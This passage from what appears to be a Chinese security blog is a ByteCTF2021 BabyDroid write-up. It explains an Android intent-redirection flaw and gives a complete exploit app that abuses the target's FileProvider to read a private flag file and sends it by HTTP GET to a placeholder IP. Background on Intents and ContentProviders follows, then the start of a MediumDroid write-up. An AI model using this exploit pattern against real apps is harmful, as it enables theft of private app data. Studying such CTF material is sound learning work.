/&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>android:authorities&#x3D;”com.example.app.fileprovider”</p><p>这样做的好处是：</p><ul><li>避免 authority 冲突</li><li>一看就知道是谁的 Provider</li></ul><p>因为总流程是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 解析 URI</span><br><span class="line">2. 取出 authority = &quot;androidx.core.content.FileProvider&quot;</span><br><span class="line">3. 在已安装 App 的 AndroidManifest.xml 里查：</span><br><span class="line">   哪个 &lt;provider&gt; 声明了这个 authority</span><br><span class="line">4. 找到对应的 Provider 实例</span><br><span class="line">5. 交给它的 openFile() / query() 等方法处理</span><br></pre></td></tr></table></figure></blockquote><p>如何获得授权?</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.babydroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Vulnerable</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> (Intent) getIntent().getParcelableExtra(<span class="string">&quot;intent&quot;</span>);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = (Intent) getIntent().getParcelableExtra(&quot;intent&quot;);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure><blockquote><p>getParcelableExtra(key) 的意思是：从“启动这个 Activity 的 Intent 的 extras（Bundle）里，按 key 取出一个 Parcelable 对象，并反序列化成 Java 对象。如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Intent</span><br><span class="line"> ├─ action</span><br><span class="line"> ├─ data</span><br><span class="line"> ├─ flags</span><br><span class="line"> └─ extras (Bundle)</span><br><span class="line">      ├─ &quot;intent&quot; -&gt; [一段 Parcelable 二进制数据]</span><br><span class="line">      ├─ &quot;foo&quot;    -&gt; &quot;bar&quot;</span><br><span class="line">      └─ ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>extras</code> 是一个 <strong>Bundle</strong>，本质是：<strong>key → value 的映射表</strong></p><p><strong>Parcelable &#x3D; Android 定义的一种“可跨进程序列化的对象格式”</strong></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Intent inner = getIntent().getParcelableExtra(&quot;intent&quot;);</span><br></pre></td></tr></table></figure><p>这个的意思是得到Intent再把里面extra中的一个自称”intent”当成真正的Intent</p><p>到此漏洞利用全流程结束</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>可以编写如下脚本</p><p>MainActivity，本文末尾介绍了下各个函数的含义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.bytectf.pwnbabydroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(getIntent().getAction() == <span class="string">&quot;evil&quot;</span> )&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> getContentResolver().openInputStream(getIntent().getData());</span><br><span class="line">                <span class="type">byte</span>[] flag = <span class="keyword">new</span> <span class="title class_">byte</span>[inputStream.available()];</span><br><span class="line">                inputStream.read(flag);</span><br><span class="line">                inputStream.close();</span><br><span class="line"></span><br><span class="line">                Log.d(<span class="string">&quot;PWN&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(flag));</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">HttpGetAsyncTask</span>().execute(<span class="string">&quot;http://xxx.xxx.xxx.xxx/?flag=&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(flag));</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="type">Intent</span> <span class="variable">intent_back</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">            intent_back.setClassName(getApplication().getPackageName(), MainActivity.class.getName());</span><br><span class="line">            intent_back.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);</span><br><span class="line"> intent_back.setData(Uri.parse(<span class="string">&quot;content://androidx.core.content.FileProvider/root/data/data/com.bytectf.babydroid/files/flag&quot;</span>));</span><br><span class="line"></span><br><span class="line">            <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">            intent.setAction(<span class="string">&quot;com.bytectf.TEST&quot;</span>);</span><br><span class="line">            intent.setClassName(<span class="string">&quot;com.bytectf.babydroid&quot;</span>, <span class="string">&quot;com.bytectf.babydroid.Vulnerable&quot;</span>);</span><br><span class="line">            intent.putExtra(<span class="string">&quot;intent&quot;</span>, intent_back);</span><br><span class="line"></span><br><span class="line">            startActivity(intent);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InputStream inputStream = getContentResolver().openInputStream(getIntent().getData());</span><br></pre></td></tr></table></figure><blockquote><p>用当前 App 的 ContentResolver，按 Intent 里携带的 URI，打开一个读取该资源内容的输入流</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ContentResolver cr = getContentResolver();</span><br></pre></td></tr></table></figure><p>含义是：向 Android 系统申请一个内容访问代理，不能直接和别的 App 的 ContentProvider 通信，必须通过 ContentResolver。</p><p>发送函数，注：LLeaves博客上的发送已经无法使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.pwnbabydroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.AsyncTask;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpGetAsyncTask</span> <span class="keyword">extends</span> <span class="title class_">AsyncTask</span>&lt;String, Void, String&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> String <span class="title function_">doInBackground</span><span class="params">(String... params)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> params[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">HttpURLConnection</span> <span class="variable">con</span> <span class="operator">=</span> (HttpURLConnection) <span class="keyword">new</span> <span class="title class_">URL</span>(url).openConnection();</span><br><span class="line">            con.setRequestMethod(<span class="string">&quot;GET&quot;</span>);</span><br><span class="line">            con.setConnectTimeout(<span class="number">5000</span>);</span><br><span class="line">            con.setReadTimeout(<span class="number">5000</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">code</span> <span class="operator">=</span> con.getResponseCode();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;HTTP &quot;</span> + code;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Exception: &quot;</span> + e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onPostExecute</span><span class="params">(String result)</span> &#123;</span><br><span class="line">        android.util.Log.d(<span class="string">&quot;PWN&quot;</span>, <span class="string">&quot;Send result: &quot;</span> + result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此外Manifest需要为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:dataExtractionRules</span>=<span class="string">&quot;@xml/data_extraction_rules&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;@xml/backup_rules&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:usesCleartextTraffic</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.Pwnbabydroid&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="其他的一些知识"><a href="#其他的一些知识" class="headerlink" title="其他的一些知识"></a>其他的一些知识</h2><p><a href="https://bbs.kanxue.com/thread-269447-1.htm">原创]Android APP漏洞之战（4）——Content Provider漏洞详解-Android安全-看雪安全社区｜专业技术交流与安全研究论坛</a></p><p>Android APP四大组件中Content Provider</p><p><strong>Intent 是 Android 的“跨组件通信消息”。</strong></p><p>它不存数据本身，而是<strong>描述一次动作&#x2F;请求</strong>：</p><ul><li>打开某个 Activity</li><li>发送一个广播</li><li>请求另一个 App 帮我做事</li><li>附带一些参数（extras）</li></ul><p>如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">startActivity(intent);      // 启动界面</span><br><span class="line">sendBroadcast(intent);      // 广播消息</span><br><span class="line">startService(intent);       // 启动服务</span><br></pre></td></tr></table></figure><p><strong>ContentProvider 是 Android 的“标准化数据访问接口”。</strong></p><p>它用来：</p><ul><li>向别的 App 提供数据</li><li>控制访问权限</li><li>隔离真实存储细节</li></ul><p>数据要给别人用，但不能把整个沙箱打开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cursor c = getContentResolver().query(uri, ...);</span><br><span class="line">InputStream in = getContentResolver().openInputStream(uri);</span><br></pre></td></tr></table></figure><p>App A 想让 App B 选一张图片</p><p>App B 有 ContentProvider（相册）</p><p>App B 用 Intent 返回：</p><ul><li>一个 <code>content://...</code> URI</li><li>外加 <code>FLAG_GRANT_READ_URI_PERMISSION</code></li></ul><p>App A 用 ContentResolver 读数据</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260116091333530.png" alt="image-20260116091333530"></p><p>我们创建一个Content Provider，其他的应用可以通过使用ContentResolver来访问ContentProvider提供的数据，而ContentResolver通过uri来定位自己要访问的数据，所以我们要先了解URI</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260116091412608.png" alt="image-20260116091412608"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheme://authority/path?query#fragment</span><br></pre></td></tr></table></figure><table><thead><tr><th>部分</th><th>含义</th><th>是否必需</th></tr></thead><tbody><tr><td>scheme</td><td>使用什么协议&#x2F;规则</td><td>✅</td></tr><tr><td>authority</td><td>由谁来管</td><td>视 scheme</td></tr><tr><td>path</td><td>具体资源路径</td><td>视情况</td></tr><tr><td>query</td><td>参数</td><td>❌</td></tr><tr><td>fragment</td><td>片段</td><td>❌</td></tr></tbody></table><p>官方文档：<a href="https://developer.android.google.cn/guide/topics/providers/content-provider-basics.html?hl=zh-cn#java">Content provider 基础知识  | App data and files  | Android Developers</a></p><p><strong>Intent的完整结构</strong></p><p><strong>Action</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.setAction(&quot;android.intent.action.VIEW&quot;);</span><br></pre></td></tr></table></figure><p>本质：一个字符串</p><p>含义：描述要执行的“动作类型”</p><p><strong>Data（URI + MIME type）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.setData(Uri.parse(&quot;content://...&quot;));</span><br></pre></td></tr></table></figure><p>类型：Uri</p><p>含义：操作的对象</p><p><strong>Category</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.addCategory(Intent.CATEGORY_DEFAULT);</span><br></pre></td></tr></table></figure><p>多用于隐式 Intent</p><p>用来进一步筛选可匹配的组件</p><p>例如：</p><p>CATEGORY_LAUNCHER</p><p>CATEGORY_DEFAULT</p><p><strong>Component（显式目标）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.setClassName(pkg, cls);</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.setComponent(new ComponentName(pkg, cls));</span><br></pre></td></tr></table></figure><p>含义：</p><p>直接指定目标 Activity &#x2F; Service &#x2F; Receiver</p><p>一旦设置了 Component：</p><p>Action &#x2F; Category &#x2F; Data 的匹配就不重要了</p><p>系统不会再做 intent-filter 匹配</p><p><strong>Extras（Bundle）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.putExtra(&quot;key&quot;, value);</span><br></pre></td></tr></table></figure><p><strong>Flags</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);</span><br></pre></td></tr></table></figure><p>Flags 会影响：</p><p>Activity 启动栈</p><p>权限授予（非常关键）</p><p>任务行为</p><p><strong>intent-filter 匹配</strong> &#x3D;Android 在“你没指定要启动谁”的情况下，帮你从系统里找一个“愿意接这个 Intent 的组件”。</p><p><code>intent-filter</code> 写在 <strong>AndroidManifest.xml</strong> 里，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;activity android:name=&quot;.Vulnerable&quot;&gt;</span><br><span class="line">    &lt;intent-filter&gt;</span><br><span class="line">        &lt;action android:name=&quot;com.bytectf.TEST&quot;/&gt;</span><br><span class="line">    &lt;/intent-filter&gt;</span><br><span class="line">&lt;/activity&gt;</span><br></pre></td></tr></table></figure><p>它的意思是：</p><blockquote><p><strong>如果有 Intent 的 action 是 <code>com.bytectf.TEST</code>，</strong></p><p><strong>系统可以把它交给我处理。”</strong></p></blockquote><p>如果 <strong>没有 setClass &#x2F; setComponent</strong>，系统会：</p><ol><li>看 intent 里有什么：<ul><li>action</li><li>data (URI &#x2F; MIME)</li><li>category</li></ul></li><li>扫描所有已安装 App 的 manifest</li><li>找 <code>&lt;intent-filter&gt;</code> 满足以下规则的组件：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Intent setClassName(String packageName, String className)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ByteCTF2021-BabyDroid复现&quot;&gt;&lt;a href=&quot;#ByteCTF2021-BabyDroid复现&quot; class=&quot;headerlink&quot; title=&quot;ByteCTF2021 BabyDroid复现&quot;&gt;&lt;/a&gt;ByteCTF2021 BabyD</summary>
      
    
    
    
    <category term="Android" scheme="http://matriy330.github.io/categories/Android/"/>
    
    
    <category term="Android" scheme="http://matriy330.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>ByteCTF2021 MediumDroid复现</title>
    <link href="http://matriy330.github.io/1411eb04/"/>
    <id>http://matriy330.github.io/1411eb04/</id>
    <published>2026-01-17T05:38:37.000Z</published>
    <updated>2026-01-22T14:32:52.792Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ByteCTF2021-MediumDroid复现"><a href="#ByteCTF2021-MediumDroid复现" class="headerlink" title="ByteCTF2021 MediumDroid复现"></a>ByteCTF2021 MediumDroid复现</h1><p>依旧学习：<a href="https://blog.lleavesg.top/article/ByteCTF-2021-MediumDroid#1474f9088c894c0ca5a93ccf8cdc7e15">ByteCTF2021 MediumDroid复现 | LLeaves Blog</a></p><h2 id="APK分析"><a href="#APK分析" class="headerlink" title="APK分析"></a>APK分析</h2><h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><p>跟easydroid差不多组件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;30&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;11&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.bytectf.mediumdroid&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;30&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;11&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;21&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;30&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.Mediumdroid&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:usesCleartextTraffic</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.mediumdroid.MainActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.mediumdroid.TestActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.mediumdroid.FlagReceiver&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.SET_FLAG&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:name</span>=<span class="string">&quot;androidx.core.content.FileProvider&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:authorities</span>=<span class="string">&quot;androidx.core.content.FileProvider&quot;</span> <span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;android.support.FILE_PROVIDER_PATHS&quot;</span> <span class="attr">android:resource</span>=<span 